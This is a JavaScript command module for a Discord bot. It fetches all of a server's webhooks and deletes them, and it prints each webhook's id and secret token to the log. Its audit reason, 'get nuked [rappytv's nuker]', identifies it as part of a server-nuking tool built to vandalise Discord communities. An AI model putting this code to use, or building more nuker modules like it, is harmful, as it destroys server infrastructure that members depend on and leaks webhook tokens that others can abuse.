const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, PermissionsBitField } = require("discord.js");

module.exports = {
    name: `rmwebhooks`,
    options: [],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.ManageWebhooks)) return console.log(`[ERROR] I'm missing the permission ManageWebhooks (1 << 29)! [${interaction.guild.name}]`);
        const webhooks = await interaction.guild.fetchWebhooks();
        webhooks.forEach(async webhook => {
            await webhook.delete(`get nuked [rappytv's nuker]`).then(() => {
                return console.log(`[WEBHOOK] Deleted ${webhook.name} (${webhook.id}/${webhook.token})`);
            }).catch((err) => {
                return console.log(`[WEBHOOK] Failed to delete ${webhook.name} (${webhook.id}/${webhook.token}): ${err}`);
            });
        });
    }
}